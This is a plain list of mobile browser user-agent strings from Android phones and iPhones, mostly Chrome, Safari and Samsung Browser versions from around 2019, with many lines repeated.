Mozilla/5.0 (Linux; Android 5.1.1; SM-E700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-N9000Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; GT-I9190) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SLA-L02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/76.0.253539693 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/74.1.250942683 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; PRA-LX1 Build/HUAWEIPRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H735 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; MI 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.0.2; SM-G530F Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1; HTC Desire 828) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/74.0.3729.121 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.3; GT-I9300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; W-K510-EEA Build/PPR1.181008.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; CPH1893) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; MI MAX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-A320F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1; MotoE2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J701F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-A710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; GT-I9060 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; GM8 go) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; VFD 600) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; PIC-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.1.2; tr-tr; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/74.0.3729.121 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-A605F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-N9000Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; MRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-A710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; TINMO K3 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; G3221) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G800H Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-J330F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; SM-J110H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A320F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A500F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; TINMO K3 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; Venus_V3_5580) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Android 6.0.1; E2303 Build/26.3.A.0.131) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3317.0 YaaniBrowser/4.3.0.153 (Turkcell-TR) Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-N9000Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; Lenovo A7020a48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-C5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5570) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H735) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-E500H Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J730F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; Mi A2 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SM-J600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; MRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; LDN-L01 Build/HUAWEILDN-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-D693TR Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.2; Venus V5 Build/VTE1040; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-A800I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A456 Safari/602.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-J410F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
